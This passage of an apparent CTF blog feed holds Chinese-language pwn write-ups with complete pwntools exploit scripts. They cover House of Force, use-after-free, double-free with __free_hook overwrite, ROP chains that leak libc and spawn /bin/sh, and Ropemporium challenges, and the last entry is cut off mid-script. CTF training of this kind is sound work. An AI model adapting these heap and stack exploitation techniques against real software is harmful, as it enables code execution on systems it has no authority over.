&#39;./gyctf_2020_force&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29457)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,date):    sla(&#39;2:puts&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    ru(&#39;bin addr 0x&#39;)    heapaddr = int(r(12),16)    info_addr(&#39;heapaddr&#39;,heapaddr)    sa(&#39;content&#39;,str(date))    return heapaddrpayload = 0x30 * &#39;a&#39; + p64(0) + p64(0xffffffffffffffff)libc_base = add(0x200000,&#39;111&#39;) + 0x200ff0info_addr(&#39;libc_base&#39;,libc_base)malloc_hook = libc_base + 0x3c4b10heapaddr = add(0x30,payload)size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8print(&#39;size----&gt;&#39;+hex(size))add(size,&#39;a&#39;)rce = rce16[1] + libc_basepayload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[&#39;__libc_realloc&#39;] + realloc[1])add(0x20,payload)sla(&#39;2:puts&#39;,&#39;1&#39;)sla(&#39;size&#39;,&#39;30&#39;)# dbg()itr()</code></pre><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><code>bcloud_bctf_2016</code></h2><p>这个题是一个十分精妙的题，漏洞出现在程序初始化。<br><img src="http://qiqianyun.chumen77.xyz/uPic/JMsnrt.png" srcset="/img/loading.gif" alt></p><p>strcpy是以<code>\x00</code>来判断一个字符串是否结束的。<br>在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会<strong>把这个堆块的地址也给复制上去</strong>，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/5n1Rtx.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BGZjNT.png" srcset="/img/loading.gif" alt></p><p>到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去<code>0xffffffff</code>,就可以改到top chunk的size位。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>leak堆块base</li><li>修改top chunk size</li><li>hof到heaplist处</li><li>给heaplist写上free got，用edit，修改其为puts</li><li>泄漏libc地址</li><li>修改free got 为system，然后指向<code>/bin/sh\x00</code></li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timelocal_file  = &#39;./bcloud_bctf_2016&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27301)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def name(name):    sa(&#39;name&#39;,str(name))    ru(&#39;b&#39;)    heapbase = uu32(r(4)) - 0x8    info_addr(&#39;heapbase&#39;,heapbase)    return heapbasedef org(org,host):    sa(&#39;Org:&#39;,str(org))    sla(&#39;Host:&#39;,str(host))def add(size,content):    sla(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;length&#39;,str(size))    sa(&#39;content:&#39;,str(content))def edit(id,content):    sla(&#39;---&gt;&gt;&#39;,&#39;3&#39;)    sla(&#39;id&#39;,str(id))    sa(&#39;the new content&#39;,str(content))def free(id):    sla(&#39;-&gt;&#39;,&#39;4&#39;)    sla(&#39;id&#39;,str(id))context.log_level = &#39;debug&#39;sizelist = 0x804B0A0heaplist = 0x804B120heapbase = name(&#39;a&#39; * (0x40-1) + &#39;b&#39;)top = heapbase + 0xd8info_addr(&#39;top&#39;,top)org(&#39;b&#39;*0x40,p32(0xffffffff)) #chang top chunk sizesize = heaplist - top - 0x10add(size,&#39;\n&#39;)add(0x18,&#39;\n&#39;)payload = p32(0) + p32(elf.got[&#39;free&#39;]) + p32(elf.got[&#39;atoi&#39;])  +p32(0x804B128+4+4) + &#39;/bin/sh\x00&#39;edit(1,payload + &#39;\n&#39;)puts_plt = elf.plt[&#39;puts&#39;]edit(1,p32(puts_plt) + &#39;\n&#39;)free(2)io.recv(1)io.recv(1)atoi = uu32(r(4))info_addr(&#39;atoi&#39;,atoi)libc = LibcSearcher(&#39;atoi&#39;,atoi)libc_base = atoi - libc.dump(&#39;atoi&#39;)system = libc_base + libc.dump(&#39;system&#39;)info_addr(&#39;libc_base&#39;,libc_base)edit(1,p32(system) + &#39;\n&#39;)free(3)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Force&quot;&gt;&lt;a href=&quot;#House-of-Force&quot; class=&quot;headerlink&quot; title=&quot;House of Force&quot;&gt;&lt;/a&gt;House of Force&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="House系列" scheme="http://chumen77.xyz/tags/House%E7%B3%BB%E5%88%97/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF安恒月赛(4th)</title>
    <link href="http://chumen77.xyz/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/04/25/DASCTF安恒月赛/</id>
    <published>2020-04-25T13:48:11.966Z</published>
    <updated>2020-06-27T16:24:40.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-pwn"><a href="#DASCTF安恒月赛-pwn" class="headerlink" title="DASCTF安恒月赛-pwn"></a>DASCTF安恒月赛-pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开赛了，有点事情没打，晚上复现了一下。</p><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><pre><code class="python">[*] &#39;/ctf/work/ahys/echo server/test&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>程序很简单，经典栈溢出，rop利用即可。<br>但是因为是64位的，并且是glibc2.27，发现在做的时候构造rop链总是会cursh，<br>调试发现：<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>发现这段汇编直接会让程序cursh，想起来ex师傅一篇文章分析过，64位程序rop到system拿shell的时候也会这样。但是很奇怪这个也出现了，索性尝试一波。<br>解决办法：还是加个ret，让栈对其即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./test&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc.so.6&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    # io = remote(&#39;node3.buuoj.cn&#39;,25390)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400823# : pop rdi ; retoffset = 136start = 0x4005C0ret = 0x0400768sla(&#39;how long is your name:&#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,elf.got[&#39;read&#39;],elf.plt[&#39;printf&#39;],start])# dbg()sla(&#39;s you name?&#39;,payload)ru(&#39;hello &#39;)read = uu64(r(6))info_addr(&#39;printf&#39;,read)libc_base = read - libc.symbols[&#39;read&#39;]info_addr(&#39;libc_base&#39;,libc_base)binsh = libc_base  + libc.search(&quot;/bin/sh&quot;).next()system = libc_base + libc.sym[&#39;system&#39;]sla(&#39;how long is your name: &#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,binsh,system])# rec = 0x4f322 + libc_base# dbg()sla(&#39;s you name?&#39;,payload)itr()</code></pre><h2 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h2><pre><code class="python">s = &#39;akhb~chdaZrdaZudqduvdZvvv|&#39;flag = &#39;&#39;for i in range(26):    flag += chr((ord(s[i]) - 1) ^ 6)print(flag)</code></pre><h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>直接爆破了。</p><pre><code class="python">s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61]for i in range(128):    flag = &#39;&#39;    for j in range(38):        flag += chr(s[j] ^ i)    if flag[:4] == &#39;flag&#39;:        print(flag)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF安恒月赛-pwn&quot;&gt;&lt;a href=&quot;#DASCTF安恒月赛-pwn&quot; class=&quot;headerlink&quot; title=&quot;DASCTF安恒月赛-pwn&quot;&gt;&lt;/a&gt;DASCTF安恒月赛-pwn&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="rop" scheme="http://chumen77.xyz/tags/rop/"/>
    
      <category term="uaf" scheme="http://chumen77.xyz/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>uaf和double free</title>
    <link href="http://chumen77.xyz/2020/04/25/uaf%E5%92%8Cdouble%20free/"/>
    <id>http://chumen77.xyz/2020/04/25/uaf和double free/</id>
    <published>2020-04-25T03:40:09.709Z</published>
    <updated>2020-06-27T16:24:30.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="uaf和double-free"><a href="#uaf和double-free" class="headerlink" title="uaf和double free"></a>uaf和double free</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开始打算入门堆，简单记录几道相关的题。</p><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>题目较为简单存在后门函数，利用uaf漏洞攻击即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./hacknote&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27892)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sl(&#39;1&#39;)    ru(&#39;Note size &#39;)    sl(str(size))    ru(&#39;Content :&#39;)    sl(str(content))def dele(index):    sl(&#39;2&#39;)    sl(str(index))def show(index):    sl(&#39;3&#39;)    sl(str(index))ru(&#39;Your choice :&#39;)add(16,&#39;aaaa&#39;)ru(&#39;Your choice :&#39;)add(16,&#39;bbbb&#39;)ru(&#39;Your choice :&#39;)dele(0)ru(&#39;Your choice :&#39;)dele(1)ru(&#39;Your choice :&#39;)add(8,p32(elf.symbols[&#39;magic&#39;]))ru(&#39;Your choice :&#39;)show(0)itr()</code></pre><h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>题目有system函数，并且也有<code>/bin/sh\x00</code> ，当时在构造这个<code>/bin/sh\x00</code>的字符串指针的时候费了一点劲，结果发现elf有这个字符串。然后就很简单了，控制好参数即可。还是uaf漏洞进行攻击。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_babyheap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1 if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27341)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;Your choice: &#39;,&#39;1&#39;)    sla(&#39;size: \n&#39;,str(size))    sa(&#39;content: \n&#39;,str(content)) def dele(index):    sla(&#39;: &#39;,&#39;2&#39;)    sla(&#39;index: \n&#39;,str(index))def show(index):    sla(&#39;: &#39;,&#39;3&#39;)    sla(&#39;index: \n&#39;,str(index))add(32,&#39;aaaaaaaa&#39;) #0add(32,&#39;bbbbbbbb&#39;) #1dele(0)dele(1)binsh = 0x602010add(16,flat(binsh,elf.plt[&#39;system&#39;]))# dbg()show(0)itr()</code></pre><h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double free，迁移到伪造的堆块，注意控制好伪造堆块的size跟fastbin的对应。<br>改<code>__free_hook</code>为system即可。<code>__free_hook</code>的参数正好是堆块的date，较好控制。<br>（buu给的复现环境是18的，有了tcache机制，但是本人还不太熟悉，只是知道不检查size是否对应了，在16上做的，然后就调试改了改脚本，打通了buu的复现环境。下面的exp也是18的。）</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_message&#39;# local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;# remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1if debug:    io = process(local_file)    # libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25390)    # libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(length,contend) :    sla(&#39;choice: &#39;,&#39;1&#39;)    sla(&#39;length of message:\n&#39;,str(length))    sa(&#39;message:\n&#39;,str(contend))def free(index):    sla(&#39;choice: &#39;,&#39;2&#39;)    sla(&#39;to delete:\n&#39;,str(index))def edit(index,contend):    sla(&#39;choice: &#39;,&#39;3&#39;)    sla(&#39;to edit:\n&#39;,str(index))    sa(&#39;the message:\n&#39;,str(contend))def show(index):    sla(&#39;choice: &#39;,&#39;4&#39;)    sla(&#39;to display:\n&#39;,str(index))add(0x30,&#39;a&#39;) #0add(0x20,&#39;a&#39;) #1add(0x20,&#39;a&#39;) #2free(1)free(2)free(1)add(0x20,p64(0x602068))add(0x20,&#39;aaaaaaaa&#39;)add(0x20,&#39;aaaaaaaa&#39;)contend = p64(elf.got[&#39;puts&#39;])# + p64(0x30) + p64(elf.got[&#39;puts&#39;])add(0x20,contend)show(0)ru(&#39; message: &#39;)puts = uu64(r(6))libc_base = puts - libc.symbols[&#39;puts&#39;]free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]print(&#39;puts&#39; + hex(puts))print(&#39;libc_base&#39; + hex(libc_base))system = libc_base + libc.symbols[&#39;system&#39;]contend = p64(free_hook)dbg()edit(6,contend)# dbg()contend = p64(system)edit(0,contend)# dbg()add(0x8,&#39;/bin/sh\x00&#39;)free(7)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;uaf和double-free&quot;&gt;&lt;a href=&quot;#uaf和double-free&quot; class=&quot;headerlink&quot; title=&quot;uaf和double free&quot;&gt;&lt;/a&gt;uaf和double free&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>pwntools的gdb.attach</title>
    <link href="http://chumen77.xyz/2020/04/20/pwntools%E7%9A%84gdb.attach/"/>
    <id>http://chumen77.xyz/2020/04/20/pwntools的gdb.attach/</id>
    <published>2020-04-20T04:21:15.070Z</published>
    <updated>2020-07-16T13:15:04.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwntools的gdb-attach"><a href="#pwntools的gdb-attach" class="headerlink" title="pwntools的gdb.attach"></a>pwntools的gdb.attach</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在尝试学着更快的调试exp，很早就了解到这个gdb.attach，但是本人是ssh连上去的，根本用不了。然后尝试tmux这个神器，来实现gdb.attach。成功以后发现一个不好的点，pwntools gdb.attach上的gdb调试中，很多函数是没有符号表的，调试起来反而难度增加。<br><img src="http://qiqianyun.chumen77.xyz/uPic/QGWqDH.png" srcset="/img/loading.gif" alt><br>自己手动gdb.attach上去。<br><img src="http://qiqianyun.chumen77.xyz/uPic/acimnJ.png" srcset="/img/loading.gif" alt><br>然后发现谷歌也谷歌不出来，就来折腾源码了。<br><strong>版本号 ：pwntools (4.0.1)</strong></p><h2 id="改善"><a href="#改善" class="headerlink" title="改善"></a>改善</h2><p>因为正常本人都是</p><pre><code>chumen77@chumen-77:~$ gdb at pid</code></pre><p>这样来进行attach。<br><img src="http://qiqianyun.chumen77.xyz/uPic/JxHuUC.png" srcset="/img/loading.gif" alt><br>发现用pwntools时候，它进行的命令是这样的，然后思路就来了找到相关源码，改一下就好了。</p><h3 id="找关键处"><a href="#找关键处" class="headerlink" title="找关键处"></a>找关键处</h3><pre><code>/running in new terminal</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8T9BqG.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BlYHnW.png" srcset="/img/loading.gif" alt><br>删除2行和修改一行代码（<code>-q 改成 at</code>）即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XUD2ZW.png" srcset="/img/loading.gif" alt><br>发现已经可以了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwntools的gdb-attach&quot;&gt;&lt;a href=&quot;#pwntools的gdb-attach&quot; class=&quot;headerlink&quot; title=&quot;pwntools的gdb.attach&quot;&gt;&lt;/a&gt;pwntools的gdb.attach&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="杂项" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>Ropemporium 通关记录</title>
    <link href="http://chumen77.xyz/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/04/13/Ropemporium通关记录/</id>
    <published>2020-04-13T04:32:06.614Z</published>
    <updated>2020-04-15T14:13:36.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ropemporium-通关记录"><a href="#Ropemporium-通关记录" class="headerlink" title="Ropemporium 通关记录"></a>Ropemporium 通关记录</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>题目给了提示，32的buf却可以填充50个字节。并且接受用的是fgets，这个函数不用担心空字节。</p><pre><code class="c">int ret2win(){  printf(&quot;Thank you! Here&#39;s your flag:&quot;);  return system(&quot;/bin/cat flag.txt&quot;);}</code></pre><p>并且存在漏洞函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./ret2win32&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 44 + p32(0x08048659)io.sendline(payload)io.interactive()</code></pre><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./ret2win&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(0x00000400811)io.sendline(payload)io.interactive()</code></pre><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int usefulFunction(){  return system(&quot;/bin/ls&quot;);}</code></pre><p>后门函数变成了这样，但是可以看到有cat flag的字符串。这样只需要控制system的参数即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aPvOxL.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/qQOFlI.png" srcset="/img/loading.gif" alt></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./split32&#39;)key = 0x0804A030 # /bin/cat flag.txt&#39;io.recvuntil(&#39;&gt;&#39;)offset = 44payload = &#39;a&#39; * offset + p32(0x08048657) + p32(0x0804A030)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./split&#39;)io.recvuntil(&#39;&gt;&#39;)key = 0x00601060 # /bin/cat flag.txt&#39;offset = 40pop_rdi_ret = 0x0000000000400883payload = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) io.sendline(payload)io.interactive()</code></pre><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn usefulFunction(){  callme_three(4LL, 5LL, 6LL);  callme_two(4LL, 5LL, 6LL);  callme_one(4LL, 5LL, 6LL);  exit(1);}</code></pre><p>这个是关键函数，但是其是用到了给的so文件，然后ida来分析so文件。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FgKhVy.png" srcset="/img/loading.gif" alt><br>找到以后发现应该是按照顺序调用<code>callme-one，callme-two，callme-three</code>需要注意其参数都要是1，2，3.当初程序中给的是4，5，6 需要想办法来换掉这个参数。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-1"><a href="#32位：-1" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./callme32&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 44callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0pop3_ret = 0x080488a9payload = &#39;a&#39; * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>其中<code>pop3_ret</code> 是用来保持栈平衡的，且站的位置函数的返回地址。还有需要注意的问题是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/9PV8oL.png" srcset="/img/loading.gif" alt><br>注意填充以后的返回地址填的时候，通常填的是代码段的数据，但是这里汇编是<code>call</code>所以在填的时候，应该是填充其plt的地址。<br><img src="http://qiqianyun.chumen77.xyz/uPic/HxXaWe.png" srcset="/img/loading.gif" alt></p><h4 id="64位：-1"><a href="#64位：-1" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./callme&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 40callme_one = 0x00401850callme_two = 0x000401870callme_three = 0x00401810pop3_ret = 0x0000000000401ab0payload = 